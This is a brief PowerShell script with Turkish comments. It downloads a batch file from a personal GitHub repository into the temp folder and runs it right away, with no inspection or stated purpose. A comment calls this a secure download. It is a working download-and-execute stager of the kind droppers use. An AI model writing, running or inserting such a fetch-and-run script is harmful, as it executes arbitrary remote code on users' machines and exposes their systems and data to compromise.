# TLS 1.2'yi etkinleştir
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$url = 'https://raw.githubusercontent.com/OhioDucky/awsomesites.github.io/main/test.bat'
$tempPath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), 'test.bat')

# Güvenli bir şekilde dosyayı indir
$client = New-Object System.Net.WebClient
$client.DownloadFile($url, $tempPath)

# Dosyayı çalıştır
Start-Process $tempPath
